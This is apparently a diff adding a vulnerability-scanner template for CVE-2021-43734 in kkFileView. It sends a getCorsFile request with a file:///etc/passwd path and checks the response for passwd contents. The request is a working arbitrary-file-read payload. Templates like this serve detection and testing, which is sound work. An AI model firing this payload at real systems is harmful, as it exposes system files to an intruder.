@@ -1,0 +1,25 @@
+id: poc-yaml-kkfileview-getcorsfile-file-read
+info:
+  name: kkFileView getCorsFile Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2021-43734,arbitrary-file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/getCorsFile?urlPath=file:///etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
